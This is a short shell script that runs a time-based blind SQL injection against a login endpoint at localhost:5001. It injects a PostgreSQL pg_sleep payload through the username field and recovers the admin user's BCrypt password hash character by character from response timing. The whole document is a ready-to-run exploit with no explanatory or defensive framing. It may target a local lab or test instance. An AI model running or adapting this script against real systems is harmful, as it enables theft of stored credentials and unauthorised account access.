#!/bin/sh
# Extracts the admin BCrypt hash (60 chars) via time-based blind SQLi.
# Adjust SLEEP_THRESHOLD (ms) for network latency.

SLEEP_THRESHOLD=1500
CHARS='$2b.0123456789/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
HASH=""

for i in $(seq 1 60); do
  j=1
  while [ $j -le ${#CHARS} ]; do
    c=$(printf '%s' "$CHARS" | cut -c$j)
    PAYLOAD="admin' AND 1=(SELECT 1 FROM pg_sleep(CASE WHEN SUBSTRING(\\\"PasswordHash\\\",$i,1)='${c}' THEN 2 ELSE 0 END))--"
    START=$(date +%s%3N)
    curl -s -X POST http://localhost:5001/bff/auth/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"${PAYLOAD}\",\"password\":\"x\"}" > /dev/null
    ELAPSED=$(( $(date +%s%3N) - START ))
    if [ "$ELAPSED" -gt "$SLEEP_THRESHOLD" ]; then
      HASH="${HASH}${c}"
      echo "[$i] '${c}'  ->  ${HASH}"
      break
    fi
    j=$(( j + 1 ))
  done
done

echo ""
echo "Recovered hash: ${HASH}"
